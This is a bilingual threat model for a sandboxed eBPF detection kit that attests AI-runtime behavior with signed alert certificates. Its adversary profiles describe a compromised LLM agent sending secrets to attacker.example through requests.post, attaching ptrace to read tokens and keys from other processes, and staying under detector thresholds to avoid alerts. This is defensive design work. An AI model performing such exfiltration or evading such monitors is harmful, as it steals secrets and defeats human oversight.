# Threat Model — h7-demo-kit / Pulsaride-H7

Version 1.1 — 2026-06-02  
*Ajouts : §4.5 Réseau exfiltration silencieuse (ADR-019 L4), §4.6 Injection ptrace (Sprint 3)*

---

## §1 — Scope

This threat model covers the **h7-demo-kit** sandbox environment and the
core behavioral attestation primitives it exercises. The kit runs strictly
on `127.0.0.1` with no outbound traffic. The model intentionally excludes
the private `h7-core` / `h7-sensor` source tree (reported separately via
`security@pulsaride.com`).

Key assets:

| Asset | Confidentiality | Integrity | Availability |
|-------|-----------------|-----------|--------------|
| Ed25519 issuer private key (`run/keys/h7-cert-issuer.sec`) | **Critical** | **Critical** | Medium |
| Calibrated baseline (`run/baseline.json`) | Low | **Critical** | High |
| AlertCert `.cal` files (`run/alerts/`) | Low | **Critical** | Medium |
| NDJSON telemetry stream (`run/logs/alerts.ndjson`) | Low | High | Medium |
| Demo simulation scripts | Low | Medium | High |

---

## §2 — Trust Boundaries

### §2.1 — Host boundary

All demo components run on a single host. The threat model treats the host
OS and its kernel as **trusted** (BTF / eBPF infrastructure, procfs). An
attacker with root on the demo host is out of scope.

### §2.2 — Network boundary

The sensor and sinkhole bind exclusively to `127.0.0.1`. No certificate,
key, or telemetry datum leaves the machine. DNS is never queried during a
demo run.

### §2.3 — Schema boundary

The AlertCert v1.1 schema (`docs/schemas/alert-v1.1.json`) is frozen.
Adding fields without a version bump is a schema-integrity violation (see
AGENTS.md Invariant 2).

### §2.4 — Cryptographic attestation boundary

The attestation chain is:

```
baseline.json          baseline_sha256_hex (canonical JSON, sha256 key excluded)
    └─ signed by ──►   Ed25519 issuer key (run/keys/h7-cert-issuer.sec)
                            │
alert-NNNNNN.cal ──────────┘  (body contains baseline_sha256_hex binding)
    └─ verified by ─►  Ed25519 public key (fixtures/H7_RELEASE_SIGNING.pub)
```

The **canonical hash** of the baseline deliberately excludes the `sha256`
key itself — computing it over the full document would be circular. This
is documented in AGENTS.md Invariant 3 and must not be changed without an
ADR and a schema version bump.

Security property: an attacker who cannot forge an Ed25519 signature under
the issuer private key **cannot** produce a valid `.cal` alert certificate,
regardless of what they write to the NDJSON stream.

---

## §3 — Attack Surface

| Vector | Entry point | Current control |
|--------|-------------|-----------------|
| Path traversal via `/qr/{filename}` (h7-monitor) | HTTP GET | `verify-gate-hardening.py` rejects `../`, `%2F`, absolute paths |
| Stack-trace leakage via WebSocket `/stream` | WebSocket | Gate test verifies no raw exception in frames |
| CORS wildcard reflection | HTTP OPTIONS | Gate test verifies wildcard origin is never reflected |
| Tampered `.cal` file | Filesystem write | Ed25519 verification (`make verify-alert`) rejects ≥1 bit change |
| Baseline substitution | Filesystem write | `baseline_sha256_hex` binding in every `.cal` certificate |
| Signing key exfiltration | Filesystem read | `chmod 600`; never committed to VCS; `.gitignore` covers `run/keys/` |
| Demo confinement escape | subprocess | Scripts use `127.0.0.1` loopback only; no DNS; `demo-sinkhole.py` absorbs exfil beacons |
| Silent HTTP exfiltration (in-band) | AI-runtime → HTTP POST | L4 channel: `sys_enter_connect` hook → `UNKNOWN_DESTINATION` if dst hors-allowlist |
| Connexion burst / data flood | AI-runtime socket burst | L4 channel: `NET_EGRESS_BURST` 4σ rolling baseline (`make attack-burst`) |
| ptrace injection (process attach) | AI-runtime → `ptrace(PTRACE_ATTACH)` | Sprint 3: `sys_enter_ptrace` hook → `PTRACE_ATTACK` 0.85 (`make attack-ptrace`) |

---

## §4 — Adversary Profiles

### §4.1 — ADV-1 : Off-path observer

**Goal**: read telemetry or certificates from another process on the same
machine.

**Mitigation**: `chmod 600` on the private key. Alert files are
world-readable by design (they contain no secrets). The private key never
appears in a `.cal` file.

### §4.2 — ADV-2 : Baseline poisoning

**Goal**: replace `run/baseline.json` with a crafted baseline that raises
or suppresses alerts.

**Mitigation**: every alert certificate embeds `baseline_sha256_hex`. The
`make verify-alert` pipeline (`h7 cal verify-alert … --baseline …`) checks
that the bound hash matches the current baseline. A substituted baseline
produces a hash mismatch — all prior certificates become invalid. The
operator is expected to re-run `make calibrate` and `make verify` after
any baseline change.

**Residual risk**: if an attacker can both replace the baseline **and**
re-sign certificates with the issuer key, the chain is broken. This
requires the issuer private key → see §4.1.

### §4.3 — ADV-3 : Adaptive κ evasion

**Goal**: drive the attack load generator at an amplitude that stays just
below the CUSUM threshold `h`, preventing `kappa` from crossing the breach
level.

**Threat**: a sophisticated attacker with white-box knowledge of the
baseline (`mu_baseline`, `h_threshold`) could tune the fork/waitpid rate
to remain sub-threshold. This is a **known limitation** of any
threshold-based statistical detector.

**Mitigations in place**:

1. The baseline is machine-specific (`make calibrate` on each host).
   White-box knowledge requires physical access or prior compromise.
2. Multiple independent behavioral signal channels run alongside the
   κ/CUSUM statistical detector. An attacker must simultaneously evade
   **all five channels** to remain undetected: (L1) κ/CUSUM scheduling
   entropy, (L2) namespace execve classification, (L3) BGTE topological
   analysis, (L4) network egress detection, and (L5) ptrace attach detection.
3. Namespace-cookie binding (`ns_cookie` → `execve` detection) is
   independent of the κ/CUSUM channel. Shell spawn inside a registered AI
   runtime namespace produces a `LLM_AGENT_HIJACK` BREACH regardless of
   κ level.

**Residual risk**: a highly constrained, below-threshold behavioral
mimicry attack could in theory evade κ/CUSUM. The complementary
behavioral channels narrow this residual window. This limitation is
disclosed honestly in the VDP out-of-scope section (`SECURITY.md §3`).

### §4.4 — ADV-4 : Certificate replay

**Goal**: re-use a valid `.cal` certificate from a previous attack to
fabricate evidence of a new attack.

**Mitigation**: each certificate embeds `ts_ns` (nanosecond timestamp) and
`alert_cert_path` (including the sequential tick number). Replaying an old
certificate does not produce a fresh `ts_ns` aligned with the current
telemetry window. The `make verify-alert` check validates the signature,
not the freshness; freshness validation is the operator's responsibility in
audit workflows (see `gen-audit-package.py`).

### §4.5 — ADV-5 : Exfiltration réseau silencieuse

**Goal**: exfiltrer des données (clés API, tokens, secrets en mémoire) via
une connexion HTTP en apparence légitime — sans jamais spawner un shell,
invisible aux détecteurs basés sur `execve`.

**Scénario typique**: un agent LLM compromis exécute
`requests.post("https://attacker.example/collect", data=secrets)` dans le
process Python en cours — aucun appel à `exec()`, aucune création de
nouveau processus. Les canaux L1/L2/L3 restent silencieux.

**Canal de détection — L4 (ADR-019)**:

L'eBPF hook `sys_enter_connect` capture toute tentative de connexion sortante
depuis un namespace AI-runtime, quelle que soit l'issue (connexion établie
**ou** refusée). L'IP/port de destination est comparé à l'allowlist construite
lors de la calibration (120 s de trafic de référence).

- Connexion vers un endpoint inconnu → `UNKNOWN_DESTINATION` → épisode WARNING immédiat
- Burst de connexions > mu + 4σ → `NET_EGRESS_BURST` → enrichissement BREACH

**Démo**: `make attack-exfil` (connexions vers `127.0.0.1:9876` hors-allowlist)

**Mitigations en place**:
1. Calibration 120 s construit automatiquement l'allowlist de destinations légitimes.
2. `UNKNOWN_DESTINATION` est un signal dur (pas de z-score) — toute nouvelle destination
   déclenche un épisode, y compris si le trafic est sous le seuil de volume.
3. `NET_EGRESS_BURST` couvre le cas "destination connue mais volume anormal".

**Résiduel**: exfiltration lente (< 4σ) vers une destination dans l'allowlist reste
hors de portée du canal L4. Requiert une inspection DLP sémantique — hors scope et
hors positionnement déterministe de H7 (voir `SECURITY.md §3`).

---

### §4.6 — ADV-6 : Injection par ptrace

**Goal**: un agent LLM compromis appelle `ptrace(PTRACE_ATTACH, target_pid)`
pour attacher un débogueur à un autre processus — permettant la lecture mémoire
(exfil de secrets en RAM) ou l'injection de code sans `execve`.

**Pourquoi c'est dangereux**: `ptrace` donne accès complet à l'espace mémoire
et aux registres d'un processus cible. C'est le vecteur utilisé par les
debuggers légitimes, mais aussi par les rootkits et les injecteurs sophistiqués.
Un agent AI compromis l'utilisera pour extraire des tokens OAuth, des clés TLS
ou des prompts privés stockés dans un autre process.

**Canal de détection — Sprint 3 (sys_enter_ptrace)**:

L'eBPF hook `sys_enter_ptrace` filtre uniquement `PTRACE_ATTACH` (16) et
`PTRACE_SEIZE` (0x4206) — les deux primitives d'attachement — depuis tout
processus dans un namespace AI-runtime. Le kernel peut rejeter l'appel
(`EPERM`, `ptrace_scope ≥ 1`) mais le **syscall est capturé avant le contrôle
d'accès kernel**.

- Tout `ptrace_attach` depuis un namespace `is_ai_runtime` → `PTRACE_ATTACK`
  → épisode BREACH immédiat, confiance 0.85

**Démo**: `make attack-ptrace` (fork d'un enfant + `ptrace(PTRACE_ATTACH, child_pid)`)

**Mitigations en place**:
1. Détection au niveau syscall — le signal se déclenche avant que l'attachement réussisse.
2. `EPERM` kernel (`yama/ptrace_scope=1`) limite le blast radius — H7 détecte quand même.
3. Confiance 0.85 : un épisode BREACH est ouvert, AlertCert Ed25519 émis, DORA log.

**Résiduel**: `clone` (création de thread) n'est pas hookée — trop de bruit sur les
runtimes AI multi-threadés (Python asyncio, inference workers). Les canaux L1/L3 couvrent
les anomalies de scheduling induites par un thread malveillant.

---

## §5 — Out of Scope

- Denial-of-service against your own local machine via the simulation
  scripts (designed to stress the scheduler).
- Issues in the private `h7-core` / `h7-sensor` source (not published
  here — report separately).
- Supply-chain attacks on the Python stdlib or standard system libraries
  used by the demo scripts.
- Attacks requiring root on the demo host.

---

## §6 — Assumptions and Non-Goals

- The demo kit is **not** a production deployment. It has no multi-tenant
  isolation, no rate limiting, and no authentication on the loopback HTTP
  endpoints.
- The issuer key pair generated by `make setup` is **demo-only**. In
  production, the issuer key lives in `/etc/h7/` with appropriate DAC/MAC
  controls (see `docker-compose.prod.yml`).
- This model does not cover the `h7-monitor` frontend (separate codebase).

---

*Report vulnerabilities to `security@pulsaride.com`. See `SECURITY.md` for
the full VDP.*
